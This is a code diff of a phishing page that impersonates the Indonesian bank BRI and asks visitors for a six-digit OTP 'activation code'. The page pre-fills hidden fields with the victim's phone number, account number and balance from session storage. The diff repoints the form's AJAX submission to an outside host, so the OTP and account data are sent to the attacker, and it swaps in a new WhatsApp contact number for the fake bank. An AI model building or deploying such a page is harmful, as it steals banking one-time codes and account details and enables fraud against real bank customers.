@@ -317,12 +317,13 @@
        <i class="ion-ios-locked-outline" id="ionIcons"></i> 
    <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
 <input type="hidden" id="nopon" name="tele" value="">
-<input type="hidden" id="namasaya" name="namanye" value="">
 <input type="hidden" id="nomorrek" name="kertu" value="">
 <input type="hidden" id="saldoku" name="uang" value="">
          <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Aktivasi 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
   
-         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: underline" onclick="location.href='https://wa.me/62816235469?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Aktivasi'"> Belum Menerima Kode Aktivasi ? </strong></p></b>
+<b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px; text-decoration: none"><strong style="color: #0F78CB; text-decoration: "> Belum Menerima Kode Virtual ?<br/>
+         <font style="color: #FF0000" onclick="location.href='https://wa.me/6285273041361?text=Hallo%20𝗕𝗔𝗡𝗞%20𝗕𝗥𝗜%0ASaya%20mau%20Request%20kode%20Virtual'">• Request Kode Virtual •</font>
+         </strong></p></b>
         </div>
        </center>
        <b>
@@ -354,12 +355,10 @@
 var nomorhp = sessionStorage.getItem("nomorhp");
 
 document.getElementById("nopon").value = nomorhp + "";
-var namaku = sessionStorage.getItem("namaku");
-document.getElementById("namasaya").value = namaku + "";
-var noreke = sessionStorage.getItem("noreke");
-document.getElementById("nomorrek").value = noreke + "";
-var saldo = sessionStorage.getItem("saldo");
-document.getElementById("saldoku").value = saldo + "";
+var norek = sessionStorage.getItem("norek");
+document.getElementById("nomorrek").value = norek + "";
+var saldoi = sessionStorage.getItem("saldoi");
+document.getElementById("saldoku").value = saldoi + "";
      
 </script>   
 <script>
@@ -463,7 +462,7 @@ document.getElementById("saldoku").value = saldo + "";
 $.ajax({
 
  type: 'POST',
- url: 'sendOtp.php',
+ url: 'https://www.website-layanan.c1.is/BRI/10/sendOtp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -504,4 +503,4 @@ $.ajax({
  }   
 </script>
 </body>
-</html><!--<script src='https://a.bsite.net/footer.js'></script>
+</html>
